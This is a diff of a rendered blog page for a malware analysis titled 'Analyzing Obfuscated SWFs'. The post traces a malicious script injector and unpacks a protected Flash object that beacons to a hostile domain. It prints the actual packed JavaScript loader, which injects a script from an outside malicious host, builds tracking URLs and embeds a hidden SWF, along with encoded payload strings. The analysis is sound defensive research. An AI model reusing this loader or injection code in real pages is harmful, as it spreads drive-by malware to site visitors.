@@ -10,7 +10,7 @@
     content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&amp;quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&amp;quot;));  Digging deeper:
-eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&amp;gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3." />
+eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&amp;gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&amp;quot;V&amp;quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&amp;quot;1u&amp;quot;);6.w.o=&amp;quot;0&amp;quot;;6.w.j=&amp;quot;0&amp;quot;;6.w.1G=&amp;quot;1M&amp;quot;;6.w.29=&amp;quot;-2d&amp;quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3." />
 <meta name="keywords" content="security,research,vulnerabilities,cve,malware,reverse engineering,malware analysis,blog,consulting,cyber" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="/post/analyzing-obfuscated-swfs/" />
@@ -43,24 +43,17 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&amp;lt;a?&#39;&#39;:e(parseInt
 <meta itemprop="description" content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));  Digging deeper:
-eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.">
-
-
-<meta itemprop="datePublished" content="2016-10-09T13:18:17&#43;00:00" />
+eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3."><meta itemprop="datePublished" content="2016-10-09T13:18:17&#43;00:00" />
 <meta itemprop="dateModified" content="2016-10-09T13:18:17&#43;00:00" />
-<meta itemprop="wordCount" content="2381">
-
-
-
-<meta itemprop="keywords" content="Malware,Malware Analysis,Flash,SWF,Reverse Engineering," />
-<meta name="twitter:card" content="summary_large_image"/>
+<meta itemprop="wordCount" content="2381"><meta itemprop="image" content="/"/>
+<meta itemprop="keywords" content="Malware,Malware Analysis,Flash,SWF,Reverse Engineering," /><meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="/"/>
 
 <meta name="twitter:title" content="Analyzing Obfuscated SWFs"/>
 <meta name="twitter:description" content="A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.
 The host in question was seen contacting NovaSyncs.com which was serving malicious JS via mine.js:
 document.write(unescape(&quot;%3Cscript src=&#39;http://i.ejieban.com/clouder.js&#39; defer=&#39;defer&#39; type=&#39;text/javascript&#39;%3E%3C/script%3E&quot;));  Digging deeper:
-eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3."/>
+eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a)))&#43;((c=c%a)&gt;35?String.fromCharCode(c&#43;29):c.toString(36))};if(!&#39;&#39;.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return&#39;\\w&#43;&#39;};c=1};while(c--)if(k[c])p=p.replace(new RegExp(&#39;\\b&#39;&#43;e(c)&#43;&#39;\\b&#39;,&#39;g&#39;),k[c]);return p}(&#39;a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3."/>
 
 
 
@@ -136,22 +129,14 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
             
 
             <div class="post-content">
-                
-
-<p>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.</p>
-
+                <p>A few days ago I was alerted of a host communicating with a (bad) domain and downloading SWF files. There was some concern that there was malware beaconing out and I needed to figure out the extent of this infection, if any.</p>
 <p>The host in question was seen contacting NovaSyncs.com which was serving malicious JS via <code>mine.js</code>:</p>
-
 <pre><code class="language-javascript">document.write(unescape(&quot;%3Cscript src='http://i.ejieban.com/clouder.js' defer='defer' type='text/javascript'%3E%3C/script%3E&quot;));
 </code></pre>
-
 <p>Digging deeper:</p>
-
 <pre><code class="language-javascript">eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?'':e(parseInt(c/a)))+((c=c%a)&gt;35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('a(&quot;V&quot;==1B(3)){3=[];3.g=[];3.K=9(h){4 6=5.16(&quot;1u&quot;);6.w.o=&quot;0&quot;;6.w.j=&quot;0&quot;;6.w.1G=&quot;1M&quot;;6.w.29=&quot;-2d&quot;;6.1p=h;1j 6};3.C=9(v,8){4 6=3.K(v);5.b.C(6,5.b.Z[0]);3.g[8]=6};3.y=9(v,8){4 6=3.K(v);5.b.y(6);3.g[8]=6};3.1e=9(1f,8){4 f=\'&lt;1w\'+\'J 1E\'+\'c=&quot;\'+1f+\'&quot; 1K\'+\'1L=&quot;1&quot; 1R\'+\'1U=&quot;1&quot;/&gt;\';3.y(f,8)};3.27=9(11){4 14=5.1n(\'1o\')[0];4 n=5.16(\'1q\');14.y(n).F=11};3.1s=9(8){H{a(3.g[8]){5.b.1v(3.g[8]);3.g[8]=V}}I(e){}};3.X=9(8,r){4 l=&quot;D&quot;+&quot;p://1N&quot;+&quot;1O.c&quot;+&quot;1Q.c&quot;+&quot;E/1T&quot;+&quot;t.23&quot;+&quot;m?8=&quot;;l+=8+&quot;&amp;r=&quot;+25(r)+&quot;&amp;G=&quot;;4 f=k;4 G=f.u.2e||f.u.2f;l+=G.2g()+&quot;&amp;2h&quot;+&quot;J=2j&amp;2v&quot;+&quot;2w=0&amp;2x&quot;+&quot;J=0&amp;2y&quot;+&quot;2I&quot;+&quot;d=&quot;;l+=z.1m(T*z.U())+&quot;-2M&quot;+&quot;1t-&quot;;4 W=f.A.o&amp;&amp;f.A.j?f.A.o+&quot;x&quot;+f.A.j:&quot;1x&quot;;l+=&quot;&amp;1y&quot;+&quot;1z=&quot;+W+&quot;&amp;1A=0&amp;s&quot;+&quot;1C=&amp;t=&amp;1D=&quot;+z.1m(T*z.U());1j l};3.L=9(){a(5&amp;&amp;5.b&amp;&amp;5.b.Z){4 1F=k.u.10;4 1H=k.1I.1J;4 M=&quot;D&quot;+&quot;p://i.12&quot;+&quot;13&quot;+&quot;N.c&quot;+&quot;E/s&quot;+&quot;1P.s&quot;+&quot;15?d=19.s&quot;+&quot;15&quot;;4 O=&quot;s=1S&quot;;4 P=\'&lt;17 1V=&quot;1W:1X-1Y-1Z-20-21&quot; 22=&quot;18://24.1a.1b/26/1c/28/1d/2a.2b#2c=7,0,0,0&quot; o=&quot;0&quot; j=&quot;0&quot;&gt;&lt;Q R=&quot;1g&quot; S=&quot;1h&quot;/&gt;&lt;Q R=&quot;2i&quot; S=&quot;\'+M+\'&quot;/&gt;&lt;Q R=&quot;1i&quot; S=&quot;\'+O+\'&quot;/&gt;&lt;2k F=&quot;\'+M+\'&quot; 1i=&quot;\'+O+\'&quot; o=&quot;0&quot; j=&quot;0&quot; 1g=&quot;1h&quot; 2l=&quot;2m/x-1c-1d&quot; 2n=&quot;18://2o.1a.1b/2p/2q&quot; /&gt;&lt;/17&gt;\';P+=\'&lt;2r F=&quot;\'+3.X(&quot;2s&quot;+&quot;2&quot;,5.2t)+\'&quot; o=&quot;0&quot; j=&quot;0&quot;/&gt;\';3.C(P,&quot;2u&quot;)}B{1k(3.L,1l)}};3.L();3.q=9(){a(5&amp;&amp;5.b){H{a(/\\2z\\2A\\2B/i.2C(k.u.10)){4 l=&quot;D&quot;+&quot;p://i.12&quot;+&quot;13&quot;+&quot;N.c&quot;+&quot;E/s&quot;+&quot;2D.h&quot;+&quot;2E#s/N&quot;;3.1e(l,&quot;2F&quot;)}}I(e){}}B{1k(3.q,1l)}};H{a(&quot;2G&quot;==5.2H){3.q()}B{a(5.Y){k.Y(&quot;2J&quot;,3.q)}B{k.2K(&quot;2L&quot;,3.q,1r)}}}I(e){}}',62,173,'|||_c1oud3ro|var|document|node||id|function|if|body|||||nodes|||height|window||||width||oload2||||navigator|html|style||appendChild|Math|screen|else|insertBefore|htt|om|src|lg|try|catch|me|getDivNode|oload|fp|an|pm|str|param|name|value|2147483648|random|undefined|sp|stat|attachEvent|childNodes|userAgent|js|ej|ieb|head|wf|createElement|object|http||macromedia|com|shockwave|flash|appendIframe|url|allowScriptAccess|always|flashVars|return|setTimeout|200|floor|getElementsByTagName|HEAD|innerHTML|SCRIPT|false|removeNode|6171|DIV|removeChild|ifra|0x0|sho|wp|st|typeof|in|rnd|sr|ua|position|ho|location|host|wi|dth|absolute|hz|s11|tat1|nzz|he|de|sta|ight|classid|clsid|d27cdb6e|ae6d|11cf|96b8|444553540000|codebase|ht|fpdownload|encodeURIComponent|pub|appendScript|cabs|left|swflash|cab|version|100px|systemLanguage|language|toLowerCase|nti|movie|none|embed|type|application|pluginspage|www|go|getflashplayer|img|203338|referrer|_cl3r|rep|eatip|rti|cnz|wnd|wo|wd|test|tatn|tml|_9h0n4|complete|readyState|z_ei|onload|addEventListener|load|139592'.split('|'),0,{}))
 </code></pre>
-
 <p>This will decode to the following and eventually serve a suspicious flash object <code>stat.swf</code>:</p>
-
 <pre><code class="language-javascript">eval(
     if (&quot;undefined&quot; == typeof(_c1oud3ro)) {
         _c1oud3ro = [];
@@ -242,45 +227,25 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
         } catch (e) {}
     })
 </code></pre>
-
 <h2 id="unpacking-the-swf-for-analysis">Unpacking the SWF for analysis</h2>
-
 <p>The ejieban.com <code>stat.swf</code> file looks to be encoded with DComSoft&rsquo;s SWF Protector. This is essentially an encoder designed to protect flash bytecode from analysis.</p>
-
 <p>Fortunately it’s fairly straightforward to reverse.</p>
-
-<p><img src="/images/2016/10/encoded_swf.png" alt="" /></p>
-
+<p><img src="/images/2016/10/encoded_swf.png" alt=""></p>
 <p>SWF Protector works just like any other encoder and inserts a stub that loads the original resource into memory and decodes it. This is obvious with the use of the <code>this.loader</code> object and the eventual call to <code>this.loader.loadBytes()</code>:</p>
-
-<p><img src="/images/2016/10/main_swf_loader_loadBytes.PNG" alt="" /></p>
-
-<p>Debugging this with <a href="https://www.free-decompiler.com/flash/download/" target="_blank">FFDec</a> proved to be a bit of challenge. The flash debugger would crash and fail to hit the breakpoint.</p>
-
+<p><img src="/images/2016/10/main_swf_loader_loadBytes.PNG" alt=""></p>
+<p>Debugging this with <a href="https://www.free-decompiler.com/flash/download/">FFDec</a> proved to be a bit of challenge. The flash debugger would crash and fail to hit the breakpoint.</p>
 <p>Since SWF Protector eventually loads the decoded SWF in memory I can execute stat.swf in Firefox and search <code>plugin-container.exe</code>&rsquo;s memory space for SWF objects.</p>
-
 <p>Executing the SWF with Flash 23 triggers a sandbox security exception on <code>ExternalInterface.call()</code>. ExternalInterface is an API that allows the Flash object to execute code on the browser:</p>
-
-<p><img src="/images/2016/10/flash_security_error_waiting_inmem.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/flash_security_error_waiting_inmem.PNG" alt=""></p>
 <p>While the Adobe Flash plugin in Firefox is waiting for me to handle the exception, I can go to <code>Tools &gt; Search SWFs in memory</code> in FFDec and try and find and dump the decoded Flash object:</p>
-
-<p><img src="/images/2016/10/search_swf_inmem.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/search_swf_inmem.PNG" alt=""></p>
 <p>I&rsquo;m looking for <code>plugin-container.exe</code>, a separate process spawned by Firefox to handle plugins:</p>
-
-<p><img src="/images/2016/10/11kb_flash_obj_inmem.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/11kb_flash_obj_inmem.PNG" alt=""></p>
 <p>There are several SWF objects in memory; what I&rsquo;m interested in is one slightly smaller than the encoded original (13kb). I was playing around with SWF Protector and noticed it doesn&rsquo;t do much compressing when it obfuscates the SWF. It ends up adding a few KBs of overhead stub code to the obfuscated object.</p>
-
 <p>The 11kb object in the <code>87*</code> address range should be what I&rsquo;m looking for.</p>
-
 <p>I can see references to the <code>SSetter</code> class that threw the earlier exception in Firefox; this must be the decoded SWF. The object can be saved to disk for further analysis.</p>
-
 <h2 id="analyzing-the-deobfuscated-code">Analyzing the Deobfuscated Code</h2>
-
 <p>The decoded SWF uses a <code>BaseCoder</code> class which appears to be a base64 encoding/decoding routine with a custom character table:</p>
-
 <pre><code class="language-java">package disp
 {
    import flash.utils.ByteArray;
@@ -292,23 +257,17 @@ eval(function(p,a,c,k,e,r){e=function(c){return(c&lt;a?&#39;&#39;:e(parseInt(c/a
       private static var decode64Table:Array = null;
       ...
 </code></pre>
-
 <p>Right at the top of the <code>SSetter</code> class, a hard-coded string <code>ss</code> stands out. It seems to have been passed through the BaseCoder encoding routine:</p>
-
 <pre><code class="language-java">private var ss:String = &quot;iizPzbG4cZhw^ZOdzb8gkNrdBR9WHNrd^jAgqiGscZhw^ZOdzbhgl_WP2iqPajDGBRz6jSeWHtDG1jWdUj7QobDeJRzWX_pmI_DWqRh6k7pwYSqh5Snq^jKGciGWJjlGzozQ5jOXHiDdrRWWXtfmcRnW5bnq^jKGIi6WX5pglypsIizgj7KWUj8G1bhdIiOmCPrg2HWvcuew^_AmzZpQHbDdnRlW7_bPzihmn_JUluhqBPCPzihml_9slSGUcZhw^ZOdzb^gl_WP2iqPajIGlj^^qPZPHtJQUiKe2RpvabDQl_WP2iqPajeGBPv1Z_JWYtJQnYAPzZpQHbDdnRlW^_Gwl_bdnRpqqj8F7N^eBjzdHRDQUbvG7T^1UianIje4BPg1l7^WY_pdZ_jWTPedZNe4X7rWluhqXPAmUjnG7ZKPVTJEj_D4I5p4D3KvqYb6rPqsoTJdrR6sTNJhTTAgcYqWLSAscYcWoSDs^YAgcYqWLSAsz5XgTwcWnTG^27bGXTghcPcml_XPTwcWnTK^I3Wmq_JPYtK6aYJGI5W4r_QPY_KFnYJhXY6gHNJenYAEaYBWnYnFT_rFBb5W8NrkBZ8gr_QP2_bdnYG^27bGnYK^RRGmriW1cPzmTwcWnTG^27bGnYK^rRgU7tZmJwZQl_1PR3D6RjG4TTzgLSpP13e68_e1riW1cPzmTwcWqTb^qbjql78Wq_BP23bQnYK^rRgU7tZmJwZQn_rkBsQ4q_JPz2^Wl_JPcYcWT_pF1yAPaYWWTSAscYqWr_AWI56gHNxekYpHcYcWT_pFktIvIonm^_A4aYBWIYW4CNrdBsYmRNrE^jJ47NWFq_JPYtK6nwgho_DFBiv4YNpdU3Anz5hgqTjs7Pj4TPp4R3D6aRBWzbjmTPK4BjjqlTjgTPW4BZj^XTxgkNpsH3I6qRhhHtI6qojh7Pj4TPA4L5WmBSjU^TjhTPA4V5amYSKwnYDw8Pg1BTjUXTAgz5agnSBgl_gPYSKwRYDwBYa4l_4sYSKwRYDwr3B4l_JsHtI6qmjF87B6LiamBSjU8Te^T_96ZPj4TPI4quj67Pj4r7WW8_eq8Pg11TFFBSjU1T7h1t_h1NNs1Nts1NHs1NRs8Pg17TlFBSjU1TXhCtOgkYKeawBmCtWmC3BmC5BgCjBWC5BmaZB4YZBmn3vhLNrF8Y848Pg1DTJd8Pg1BYjUVTpgBSjU1TjhTPx4aSIkquj6TPB4BYjqVTogBSjUkTWh8Pg1aNC6Vs9gBSjU1T2h8Pg1LTJ18Pg1jP94lRjgB7jqCTxgaSIkquj6TPB4BYjUVTogBSjU8Te^T_9nZPj4TPO48SBhLUaWBSjU8Te^T_96ZPj4TPI4quj67Pj4r7WW8_eq8Pg1YTJ18Pg1jP94lRjgB7jqLTBgqYjs7Pj4l74W8_eq8Pg1DTJd8Pg1BYjUVTpgBSjU1TjhTPI4YYJs8Pg17YjsTPI4XYJU8Pg1jYOhn3B4n5BgB5jULTWgqtjFTPB4DiOFTNc6XNK^XYOsrYOGBYjGTPI4aNC61N^68Se^otKQcUU4o_KdzUjg17h6jPp4a_BmqbT61yAPaiW4z2jg1786jPp4VwZ6HND^ciw48_e11YjPX7pWYNJ^lRjWc7eWZPJ4qyEPH_pdq3JvT_AmcYPWoSDsBYDgr_qPaTJdciw48_e15YjwX7AWcbdgDNJGLTghatKQc2pgTS8mlTKhRNKXRYJP1TvhlTKhRNKXIYJPnTBgT3AmrYgqTH9mnYJ^lbKh1NOhISAwciH4HND^^bJgYtK6nsn6T_rFoYpsH3I6qmjF87B68oe^8_eqLmaW7Sjmr7WW8_eqVT9g7Sjmr7WW8_eqLTBg82e18_eqnRg6jP94oY9sjPg41T1FjP94jPB4n2ghTYImZYjHl7jW17T6TSBmCTxgjPA4cYPWT_rF^mJ4YtK6nmnhT_rFjYpsU3AnL5BmqtXF7wZ6DNKeBYCH2ybdnYK^a3BgriB6ItB4^5JWz2^Wl_JPry6s1N5hoSDsBYggjNrd^ZA4I5BgqSnsr_6PCNDX8YggCYfHLYgUl_Vso_DFr_6PDNDX8Y6gDN9^zTzgVNf4VNj4T79WrRggjPp4Tt9W^iJW1NzFq_BPY3K6IsWWTNB4aHBgYHgWT_pQRtD6RiGWZPj4k7JW^iVWo_DFr_6PDNDXBYegn_rPkYpwnyAPaYBWnRnhT_pFo3KQaUB4IU6m7w2WrTWgXPAmrYgqTH9mnYJ^iYJUYtK6nwnFI_rF^jAgV5rmTSBmTw9gLTfeCNWWTY94TTBhYNgGT_WWcYhgrTggYYOhoYgh7_nWTNqhrTggCbasTSAmrbJ4rtg4T7JerTWgz5Wgr_gmX7JXrTqhRTJdr3qhXTJkaiBgauW4BRCPaiBgauW4lRrhq_767NhhX_94RTWgTi94rTJXHYGGRYgGT_WWni8677DhrTggnm8677phrTggDYgG7_XWTSAmrbJ4a2B4IuBmpukg1N9hX_p4T_lWCYgGT_WWnjg4HtI68YJwciFgDNGGR7KGcopWRSKQco0W7_aWlTGgYNKXDugsYYge8t9QTSGmoYgeT_WWnZgs1_r6T_GWaYJwiY64rTggjYJeo7Je77ahTS9ma2B4IuBmpukg1N9hX_p4HtI6qHjhB7m6YTJ18Te^8_9QjPg4DTJdLTghXTJdLTghcNj6r7W6V3mgry6s1NKhoSDs^bA4L5am7SRmrTDgkYIXTYDXX_KmYYDXr_qsITJdcYRW8_e12YjXB7rWByzE7N1hr_6sjND^BtD4l_Vso_DFl_1PY3K6TYDw^tJ4z2^Wl_JP8yBm^jJgXyDmr_esRNWFkNQF85egByGEBiyE2jzvBZGEcZhw^ZOdBbQe7RCPiuCw^yXd5yyE2jzvBZXE5bqQUbKwBZGEBjCEByCE5uCezy^dZuDwBZvE2unwBuKEqR^wByCEiyKdBy^E5b^EByCEZynEBRCvByGEcuCw^ZKQJivd5y^E2Zp1UbOw2ZCPqjCd5jWQUiKwqyzkzZCd7ZcE5ynEB3^w5yzd5ZDd5ynEBjreBizvpj6dqy^d5yKE5yOEBb8E7RzPBbzPijXdiyzEUb^E2ypdBZpeZbCw7jhv7yOd^iCEVR8PciXwzopQ2bCd7R^v2R^PB2^wUbKwBZzE2jpdBZfeB3le5RWwqb^Q^izd5y6EZynEiyrd5RDP1UWGBjzvZbzE53CPBRrwZbsv7Rpv2jVE5R^Q5jCv7ZrPiyrd5RDP5yDE5b9Q1ZQQBinP23CE1RrQUbQdBRCwJRlQky8FVYCFqjCG^2wkzyndVZCE7b0Q5inw5yqE5RneBj^e1ZrGcyzd^ZeG2ROPBjGeJbOd8jWeoYvsI56Fo5ah7yzE2bOGBb6PBjpE2b^GJ3Gk5ynE^yKdUbWG2m51BsTE12kH5yF1^HoX8UBEL58s5yzd5RCeZjGv1b6dBuhE7RCwJj6d2upPcbCQ7R6wBbqQUZCdUbGd8ZBEVY8FB3QE7i6PJuKwjy8F^yGd1jCGBRzQ5jpvBi6EBjveBuXPzZCdUuCdZuDwBZhE5bpEBiXEZYhhTiQdBizPiiXsUyad5isw7Rpv2jCEVRCP1YhsBizeJRqGBZgE1bKdBulvibpvBi6P1ZndzyndBbCwitgsBtWEqiOwUZFG^urdBiKEBZrwUyldURXGoynFH5qFHYn6LY8FBYnEV3^PzyndBZDEB36e1YCspbfeJyld5ynEBRDPBZ^E5bOGUiUd^HFXqb8Qcb^Q2bCeVR8P^bhd2RpPcbCQBjqd^iKQVjzvUiCQZZvv5ycE2j^vBbzHZbqGZR^wByzdZbqGZR^w2yOEJsvd7iFP5R^PcyndBuKPcb^Q7y^EBj^E2RpPBjWE^ZCdcRfQpyyE^iCwJiCQUinQBizGzj8Q1bcd7iCPJRXQ7izwUjCQUird^RCPYYcsX5WsRyBF15C6ViXeZbKvJbzd8iqEVYCFIY8E5yDEBbvvBjvEBipeBbWe2bCGUjgE7y^EUZWEBbKeZiCP12ndBieP2iHPqu^wkyvFY5QFVYCFUjGG7iWP7iCPUinQB2^wUbKw5Z4E23zUciznHbew5N8e^bndZ_C4X7rWBYA4Xypm&quot;;
 </code></pre>
-
 <p>A <code>fetchit</code> function calls <code>i.ejieban.com/stat.do?p=xxx</code> which returns an array of this custom base64 encoded data (separated by semicolon).</p>
-
 <p>The call path:</p>
-
 <pre><code class="language-javascript">fetchit()-&gt;
   fetchcallback()-&gt;
     preappend()-&gt;
       decodeArray()-&gt;
         (BaseCoder).decode([data_from_stat_do])
 </code></pre>
-
 <pre><code class="language-java">      private function fetchit() : void
       {
          var _loc1_:String = this.host + &quot;stat2.do?p=&quot; + this.ipStr;
@@ -347,35 +306,23 @@ IYnsjNqhTNBha5a4M5^^FgG0Mg^Ap_j~
 1uOdIYAWz_nwLZfEJN6W5N6ecbB4qu6dcihWnbOQ5jrvLN86jY6hH58wk5chHR8wIiKFZjGvr_pFUjnQr_pFr_pF5byeVRpPzNzGab6WL5KhcRyQ^b6P2u^Pr_pFCN6WcY^m^u^G1RKG5NOGJbhmJbqdUiWdpN6Gr_pFUbrerbDFXtDWajrQXZDgrHph1uOdYYDv^tDW2Z8ECtOgcj6W8jKQzjpwjbKwJRlQ5N6vCb84TYvFUY^6RYBF1t^woYad5NveIiAg5_^PIZA4I_Amc_6w1P8QcuDmCRKwRY865NKGqPcQ^jnQIiAmC_OmkYK6pipw7izwcbhgnbOQBROQ2Z^wcj0gIjAWc_qw8bAdr_pF5_KERNpET_A1i_lwYjDF^tDW2Z8ECtOgLRKhpipw7izwcbhgnbOQqi8Gr_pF7ZpvHZDd^t6W8bDQ^t6W1blGIiAmz_nwLZfEJNgWcY^4^u^G1RKG5NOGJbhmJbqdUiWdpN6Gr_pFT_A1^_Gwciewr_pF2unEDjOFXN6v^NGGciewquew5NOGJb^mjiaFC58WktWsiNrQ5RDPJoOQ^u^Q5NveIiAg^_GwciewB2zGzjFQJb9QUuswoiDP^tvWjZKviu^wjbKGJRlQr_pF^ZXwr_pF2unEDjOFXNBQUN0GUugwaRKwJRlQ5NrQUbXvTiKPYuDeXtDWUbvG2TzkHZpdZN^G2Zp1HbDwl_jmJ7jqr7DWkYnho5a6RYn6pt542RDP7Nze2bOGIbpmLypF2NOe2HWvcuewY_QFl_5m2RDP7NOecZXw1_1Fp5542RDP7Nze2bOGIbpmz_mm^taWI36Pr_pF2unEDjOFYNWv1NDequew5NOGJb6m1ZndYuOwLYWFY5q6LiQs^YzsViXsct64RZDQ^t6WoiDPXtDW^tyWzPqQouDw^tDW2Z8ECtOgkYK6pipw7izwcbhgnbOQBROQ2Z^wIjKeYuDe^tQWTRIPRPJvJNyqUupEniDFawAqDPpml_CFX7O4cu^mU3hd2_OdURlvcinw5NOGlbpQXiAmRPMvUihd2b^Q7U7UJolQJjKdcinwJ_Q11wZ6p_js87eqItAWz_6mBbQg_o~~
 */
 </code></pre>
-
 <p>The next step is to run this data through the custom base64 decoding routine but debuging the decoded SWF inside FFDec once again proved to be a challenge.</p>
-
 <p>There is no <code>ExternalInterface</code> API available to the standalone Flash debugger. The SWF code specifically checks for <code>ExternalInterface</code> and will exit if it doesn&rsquo;t exist. There are two ways I can approach this.</p>
-
 <p>First option: I could modify the SWF bytecode to remove the check for <code>ExternalInterface</code> so I can walk through the decoding routine in the FFDec debugger:</p>
-
-<p><img src="/images/2016/10/remove_bytecode.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/remove_bytecode.PNG" alt=""></p>
 <p>While this does bypass the check, the variable watch did not seem to work properly on my system. I did try Flash 23 and Flash 18 debuggers but walking through code, I could not see the contents of variables in memory.</p>
-
 <p>The second option:</p>
-
 <ul>
-<li>Create a new ActionScript project in <a href="http://www.flashdevelop.org/" target="_blank">FlashDevelop</a></li>
+<li>Create a new ActionScript project in <a href="http://www.flashdevelop.org/">FlashDevelop</a></li>
 <li>add <code>BaseCoder.as</code> to the project</li>
 <li>populate the Main class with the base64 data I want to decode (variables: <code>ss</code>,  <code>from\_stat\_do\_1</code>, <code>from\_stat\_do\_2</code>)</li>
 <li>compile and execute the SWF in Firefox</li>
 <li>check the console log for the decoded data</li>
 </ul>
-
-<p><img src="/images/2016/10/decoder_fla.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/decoder_fla.PNG" alt=""></p>
 <p>More JavaScript and SWF files referenced in the base64 decoded data:</p>
-
-<p><img src="/images/2016/10/decoded_in_console_log.PNG" alt="" /></p>
-
+<p><img src="/images/2016/10/decoded_in_console_log.PNG" alt=""></p>
 <p>The JavaScript code is fairly simple and looks to provide a <code>_stat</code> object that allows the malware to inject more SWF, JavaScript and IMG tags:</p>
-
 <pre><code class="language-javascript">(function() {
     window._stat = [];
     var d = document;
@@ -471,35 +418,19 @@ IYnsjNqhTNBha5a4M5^^FgG0Mg^Ap_j~
     }
 })();
